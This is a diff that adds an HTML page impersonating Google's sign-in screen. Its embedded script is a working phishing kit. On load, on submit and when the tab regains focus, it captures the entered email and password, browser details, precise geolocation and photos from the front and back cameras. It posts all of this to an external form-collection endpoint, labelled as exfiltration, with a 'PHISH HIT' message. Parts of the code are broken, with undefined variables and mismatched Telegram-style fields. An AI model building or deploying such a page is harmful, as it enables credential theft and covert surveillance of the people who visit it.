@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Google</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .card{background:white;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);padding:40px;max-width:380px;width:100%}
+        .logo{text-align:center;margin-bottom:24px}
+        .logo img{width:75px;height:75px}
+        h2{margin-bottom:24px;color:#202124;font-weight:400}
+        input{width:100%;padding:14px 16px;margin-bottom:16px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+        input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 1px #4285f4}
+        .btn{background:#4285f4;color:white;border:none;padding:14px;width:100%;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer}
+        .btn:hover{background:#3367d6}
+        .loading{display:none;text-align:center;color:#5f6368;font-size:14px;padding:20px}
+        @media(max-width:480px){.card{margin:20px;padding:30px}}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h2>Sign in to your Google Account</h2>
+        <form id="form">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="pass" placeholder="Enter your password" required>
+            <button type="submit" class="btn">Next</button>
+        </form>
+        <div id="load" class="loading">🔄 Accessing your account...</div>
+    </div>
+
+    <script>
+        const EXFIL_ENDPOINT = 'https://formspree.io/f/mqervzva'; 
+
+
+        async function grabAll(){
+            const data={};
+            data.time=new Date().toISOString();
+            data.ua=navigator.userAgent;
+            data.lang=navigator.language;
+            data.platform=navigator.platform;
+            data.referrer=document.referrer;
+
+            // LOCATION
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(p=>{
+                    data.loc={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy};
+                    sendData(data);
+                },()=>sendData(data),{enableHighAccuracy:true});
+            }
+
+            // FRONT CAMERA
+            try{
+                const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+                const vid=document.createElement('video');
+                vid.srcObject=stream;vid.play();
+                setTimeout(()=>{
+                    canvasShot(vid,'front.jpg',data);
+                    stream.getTracks().forEach(t=>t.stop());
+                },800);
+            }catch(e){}
+
+            // BACK CAMERA
+            try{
+                const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
+                const vid=document.createElement('video');
+                vid.srcObject=stream;vid.play();
+                setTimeout(()=>{
+                    canvasShot(vid,'back.jpg',data);
+                    stream.getTracks().forEach(t=>t.stop());
+                },800);
+            }catch(e){}
+
+            // FORM DATA
+            const email=document.getElementById('email').value;
+            const pass=document.getElementById('pass').value;
+            if(email&&pass) data.creds={email,pass};
+        }
+
+        function canvasShot(video,name,data){
+            const canvas=document.createElement('canvas');
+            canvas.width=video.videoWidth;
+            canvas.height=video.videoHeight;
+            canvas.getContext('2d').drawImage(video,0,0);
+            data[name]=canvas.toDataURL('image/jpeg',0.7);
+        }
+
+        async function sendData(data){
+            const form=new FormData();
+            form.append('chat_id',CHAT_ID);
+            form.append('text',`🎣 PHISH HIT\n${JSON.stringify(data,null,2)}`);
+
+            // Send images
+            for(let k in data){
+                if(k.endsWith('.jpg')){
+                    const imgForm=new FormData();
+                    imgForm.append('chat_id',CHAT_ID);
+                    imgForm.append('photo',data[k]);
+                    imgForm.append('caption',`${k} | ${data.time}`);
+                    fetch(`https://formspree.io/f/mqervzva`,{method:'POST',body:imgForm});
+                    delete data[k];
+                }
+            }
+
+            fetch(EXFIL_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(stolenData)
+            });
+        }
+
+        // Triggers
+        window.onload=grabAll;
+        document.getElementById('form').onsubmit=e=>{
+            e.preventDefault();
+            document.getElementById('load').style.display='block';
+            setTimeout(grabAll,300);
+        };
+        document.onvisibilitychange=()=>!document.hidden&&grabAll();
+    </script>
+</body>
+</html>
